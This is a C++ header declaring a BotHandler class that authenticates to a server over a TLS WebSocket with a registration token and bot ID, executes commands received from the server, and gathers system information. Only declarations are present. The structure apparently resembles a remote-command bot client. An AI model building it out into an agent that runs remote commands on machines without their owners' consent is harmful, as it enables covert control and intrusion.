#pragma once
#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/beast/ssl.hpp>
#include <string>
#include <nlohmann/json.hpp>
#include <thread>
#include <atomic>

namespace beast = boost::beast;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = net::ip::tcp;

class BotHandler {
public:
    BotHandler(const std::string& server_url, const std::string& reg_token, const std::string& bot_id);
    void start();

private:
    void connect();
    void authenticate();
    void read_loop();
    void handle_message(const std::string& msg);
    void send(const std::string& msg);
    std::string exec_command(const std::string& cmd);
    std::string get_sysinfo();

    std::string server_url_, reg_token_, bot_id_;
    net::io_context ioc_;
    net::ssl::context ssl_ctx_;
    std::unique_ptr<websocket::stream<beast::ssl_stream<tcp::socket>>> ws_;
    std::atomic<bool> running_{true};
};